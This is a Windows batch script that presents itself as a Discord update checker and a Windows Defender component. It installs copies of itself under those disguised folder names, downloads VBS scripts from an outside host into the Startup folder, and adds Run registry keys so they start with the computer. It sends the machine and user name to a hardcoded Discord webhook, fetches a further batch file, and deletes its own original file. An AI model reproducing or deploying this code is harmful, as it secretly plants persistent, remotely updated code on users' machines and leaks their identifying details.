@echo off
cls

if exist "%APPDATA%/DiscordUpdateChecker/%~n0%~x0" (
set userfile=YES
)
if not exist "%APPDATA%/DiscordUpdateChecker/%~n0%~x0" (
mkdir "%APPDATA%/DiscordUpdateChecker/"
copy /y %~f0 "%AppData%\DiscordUpdateChecker\"
set userfile=YES, NEW CREATED
)


if exist "%PROGRAMDATA%/DiscordUpdateChecker/%~n0%~x0" (
set pcfile=YES
)
if not exist "%PROGRAMDATA%/DiscordUpdateChecker/%~n0%~x0" (
mkdir "%PROGRAMDATA%/DiscordUpdateChecker/"
copy /y %~f0 "%PROGRAMDATA%\DiscordUpdateChecker\"
set pcfile=YES, NEW CREATED
)


if exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/DiscordUpdateChecker.vbs" (
set userauto=YES
)
if not exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/DiscordUpdateChecker.vbs" (
copy /y "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\DiscordUpdateChecker.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
curl -L "https://freestream.us.to/schulprojekt/DiscordUpdateChecker.vbs" --output "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/DiscordUpdateChecker.vbs"
set userauto=YES, NEW CREATED
)


if exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/DiscordUpdateChecker.vbs" (
set pcauto=YES
)
if not exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/DiscordUpdateChecker.vbs" (
::check for admin rights, commented out
::NET SESSION >nul 2>&1
::IF %ERRORLEVEL% EQU 0 (
::copy /y "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\DiscordUpdateChecker.vbs" "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
::curl -L "https://freestream.us.to/schulprojekt/DiscordUpdateChecker.vbs" --output "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/DiscordUpdateChecker.vbs"
::set pcauto=YES, NEW CREATED
::) ELSE (
::set pcauto=NO, NOT CREATED
::)
set pcauto=NO, NOT CREATED
)



if exist "%APPDATA%/WindowsDefenderSecurity/%~n0%~x0" (
set userregistryfile=YES
)
if not exist "%APPDATA%/WindowsDefenderSecurity/%~n0%~x0" (
mkdir "%APPDATA%/WindowsDefenderSecurity/"
copy /y %~f0 "%AppData%\WindowsDefenderSecurity\"
set userregistryfile=YES, NEW CREATED
)


if exist "%PROGRAMDATA%/WindowsDefenderSecurity/%~n0%~x0" (
set pcregistryfile=YES
)
if not exist "%PROGRAMDATA%/WindowsDefenderSecurity/%~n0%~x0" (
mkdir "%PROGRAMDATA%/WindowsDefenderSecurity/"
copy /y %~f0 "%PROGRAMDATA%\WindowsDefenderSecurity\"
set pcregistryfile=YES, NEW CREATED
)


if exist "%APPDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs" (
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v WindowsDefenderSecurity /d "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent" /f
set userregistryauto=YES
)
if not exist "%APPDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs" (
copy /y "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%APPDATA%\WindowsDefenderSecurity\"
curl -L "https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs" --output "%APPDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs"
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v WindowsDefenderSecurity /d "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent" /f
set userregistryauto=YES, NEW CREATED
)


if exist "%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs" (
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v WindowsDefenderSecurity /d "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent" /f
set pcregistryauto=YES
)
if not exist "%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs" (
::check for admin rights, commented out
::NET SESSION >nul 2>&1
::IF %ERRORLEVEL% EQU 0 (
::copy /y "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%PROGRAMDATA%\WindowsDefenderSecurity\"
::curl -L "https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs" --output "%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs"
::reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v WindowsDefenderSecurity /d "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent" /f
::set pcregistryauto=YES, NEW CREATED
::) ELSE (
::set pcregistryauto=NO, NOT CREATED
::)
set pcregistryauto=NO, NOT CREATED
)


for /f "tokens=2 delims==" %%a in ('wmic OS Get localdatetime /value') do set "dt=%%a"
set "YY=%dt:~2,2%" & set "YYYY=%dt:~0,4%" & set "MM=%dt:~4,2%" & set "DD=%dt:~6,2%"
set "HH=%dt:~8,2%" & set "Min=%dt:~10,2%" & set "Sec=%dt:~12,2%"
set time=%DD%.%MM%.%YYYY% - %HH%:%Min%:%Sec%


set content=---------------------------\nPC: %ComputerName%\n  ProgramData-Autostart: %pcauto%\n  ProgramData-File: %pcfile%\n  ProgramDataRegistry-Autostart: %pcregistryauto%\n  ProgramDataRegistry-File: %pcregistryfile%\nUSER: %USERNAME%\n  User-Autostart: %userauto%\n  User-File: %userfile%\n  UserRegistry-Autostart: %userregistryautostart%\n  UserRegistry-File: %userregistryfile%\nTIME: %time%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%content%\"}" https://discord.com/api/webhooks/1084452705105354762/4m7y_EJmQvhR6NZUIpJrJ0-ppH9q_JzOIJhEQ2EQ-6HDIFHkqYISeHyy_IHDZ4ZT1aDh


curl -L "https://freestream.us.to/schulprojekt/UpdateChecker.bat" --output "%APPDATA%/DiscordUpdateChecker/UpdateChecker.bat"
curl -L "https://freestream.us.to/schulprojekt/UpdateChecker.bat" --output "%PROGRAMDATA%/DiscordUpdateChecker/UpdateChecker.bat"

curl -L "https://freestream.us.to/schulprojekt/UpdateChecker.bat" --output "%APPDATA%/WindowsDefenderSecurity/UpdateChecker.bat"
curl -L "https://freestream.us.to/schulprojekt/UpdateChecker.bat" --output "%PROGRAMDATA%/WindowsDefenderSecurity/UpdateChecker.bat"

if %~dp0 NEQ %APPDATA%\DiscordUpdateChecker\ (
if %~dp0 NEQ %PROGRAMDATA%\DiscordUpdateChecker\ (
if %~dp0 NEQ %APPDATA%\WindowsDefenderSecurity\ (
if %~dp0 NEQ %PROGRAMDATA%\WindowsDefenderSecurity\ (
del /f /q %~f0
))))

if exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/UpdateChecker.bat" (
del /f /q "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/UpdateChecker.bat"
)

exit